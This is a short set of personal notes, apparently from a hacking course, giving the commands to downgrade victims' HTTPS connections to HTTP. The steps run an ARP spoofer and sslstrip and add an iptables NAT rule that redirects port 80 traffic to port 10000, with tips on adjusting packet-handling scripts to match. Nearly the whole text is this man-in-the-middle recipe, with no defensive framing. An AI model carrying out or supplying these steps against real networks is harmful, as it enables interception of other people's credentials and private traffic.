commands to downgrade https to http

launch your arp_spoofer program
launch sslstrip

redirect the packet from port 80 to sslstrip (p 10000)
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

notes:
-remember to change the port to 10000 in your scripts that interact with the packets.
-you need to set the iptables rules such as if you were making test on local machine (see code_injector), because the packets are already on the computer, coming from sslstrip.
